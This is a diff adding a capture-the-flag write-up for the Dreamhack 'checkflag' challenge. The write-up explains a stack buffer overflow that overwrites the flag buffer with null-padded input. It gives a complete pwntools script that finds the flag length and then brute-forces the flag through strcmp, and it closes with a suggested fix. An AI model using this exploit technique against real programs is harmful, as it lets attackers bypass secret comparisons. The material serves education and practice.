@@ -5,7 +5,6 @@ categories: [Dreamhack, Binary Exploitation]
 tags: [pwn, stack-overflow, strcmp, dreamhack]
 author: datious
 ---
-
 [Write up for dreamhack]__Challenge: checkflag | Author: datious
 
 checkflag.c
@@ -37,7 +36,7 @@ undefined8 main(void)
   if (fp != (FILE *)0x0) {
     fgets(flag,0x40,fp);
     fclose(fp);
-    fputs("What's the flag? ",stdout);
+    fputs("What\'s the flag? ",stdout);
     fflush(stdout);
     sVar2 = read(0,input,200);
     fp = stdout;
@@ -80,4 +79,123 @@ The program allows entering up to 200 bytes into the **input** buffer, which is 
 - Back to the main function: the program just returns **correct!** when **strcmp(input,flag)** returns 0 => Both of the strings have to equal.
 - Analyzing strcmp() function:
 ```
-int mystrcmp(const char *s1, const char *s2
+int mystrcmp(const char *s1, const char *s2)
+{
+    while (*s1 == *s2)
+    {
+        if (*s1 == '\0')
+            return 0;
+
+        s1++;
+        s2++;
+    }
+
+    return (unsigned char)*s1 - (unsigned char)*s2;
+}
+```
+- The **strcmp()** function compares bytes sequentially until it reachs a null byte (\x00).
+- Based on this, here is my exploitation strategy.
+    + The first, we leak flag's length. By gradually increasing the length of 'X', we can determine the length of the flag.
+    >     input: XXX\x00\x00....
+    >     flag:  XXXABCD}\x00... => return failed!
+    >     input: XXXXXXXX\x00\x00...
+    >     flag:  XXXXXXXX\x00\x00.. => return correct! the length of the 'x' string is the length of the flag. 
+
+    + The second, given the length and the hint that ***The flag matches DH{...} with printable ASCII characters (0x20-0x7e)"***. We have sufficient information to brute-force the flag character by character.
+
+2. Exploiting
+- Determine the flag length:
+    
+
+
+```
+#!/usr/bin/python3
+from pwn import *
+context.log_level = 'debug'
+exe=ELF('./checkflag',checksec=False)
+#p=process(exe.path)
+
+#finding length of the flag
+flag_size=0
+for i in range(0,0x40):
+    p=process(exe.path)
+    payload=b'A'*i
+    payload+=b'\x00'*(0x40-i)
+    payload+=b'A'*i
+    p.sendafter(b'flag? ',payload)
+    result=p.recvline()
+    if b'Correct!' in result:
+        print(f'[+] The length of the flag: {i}')
+        flag_size=i
+        p.close()
+        break
+    p.close()
+```
+- Bruteforces:
+>     Example the length of the flag is 9 (flag:DH{ABCDEF})
+>     0-input: XXXXXXX[guess]}\x00\x00.. the guess is the char from 0x20 to 0x7e
+>     0-flag:  XXXXXXXF}\x00\x00 => if guess=='F' => return correct! add to the flag! flag='F'
+>     1-input: XXXXXX[guess]F}\x00\x00...
+>     1-flag:  XXXXXXEF}\x00\x00.. => if guess=='E' => return correct! add to the flag! flag='EF'....
+
+
+
+=> DH{flag} => DH{ABCDEF}
+
+3. Script
+```
+#!/usr/bin/python3
+from pwn import *
+context.log_level = 'debug'
+exe=ELF('./checkflag',checksec=False)
+#p=process(exe.path)
+
+#finding length of the flag
+flag_size=0
+for i in range(0,0x40):
+    p=process(exe.path)
+    payload=b'A'*i
+    payload+=b'\x00'*(0x40-i)
+    payload+=b'A'*i
+    p.sendafter(b'flag? ',payload)
+    result=p.recvline()
+    if b'Correct!' in result:
+        print(f'[+] The length of the flag: {i}')
+        flag_size=i
+        p.close()
+        break
+    p.close()
+
+#bruteforces flag
+context.terminal = ['konsole','-e']
+
+payload_head=b'DH{'
+payload_rear=b'}'
+main_flag_length=flag_size-4
+
+flag=b''
+
+for i in range(main_flag_length):
+    for c in range(0x20,0x7f):
+        payload=b'A'*(flag_size-2-i)+chr(c).encode()+flag+payload_rear
+        payload+=b'\x00'*(0x40-len(payload))
+        payload+=b'A'*(flag_size-2-i)
+        p=process(exe.path)
+        p.sendafter(b'flag? ',payload)
+        re=p.recvline()
+        if b'Correct!' in re:
+            flag=chr(c).encode()+flag
+            p.close()
+            break
+        p.close()
+
+
+print(f'found: {"DH{"+flag+"}"}')
+
+```
+
+How to fix this vulnerability
+- This vulnerability is caused by reading more data than the destination buffer can hold, resulting in a stack-based buffer overflow.
+sVar2 = read(0,input,200); => sVar2 = read(0,input,sizeof(input));
+
+Goodluck!!!
